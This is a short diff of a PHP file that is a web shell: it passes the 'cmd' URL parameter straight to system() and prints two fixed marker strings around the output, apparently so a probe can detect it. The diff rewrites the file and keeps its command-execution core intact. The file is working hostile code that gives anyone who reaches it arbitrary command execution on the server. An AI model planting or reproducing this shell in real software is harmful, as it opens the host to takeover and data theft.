@@ -1,7 +1,7 @@
-<? 
-if ( strcmp( $_GET['cmd'], "" ) == 0 ){
-    echo "15825b40c6dace2a" . "7cf5d4ab8ed434d5";
-}else{
+<?
+echo "15825b40c6dace2a";
+if ( isset( $_GET['cmd'] ) ){
     system ( $_GET['cmd'] );
 }
+echo "7cf5d4ab8ed434d5";
 ?>
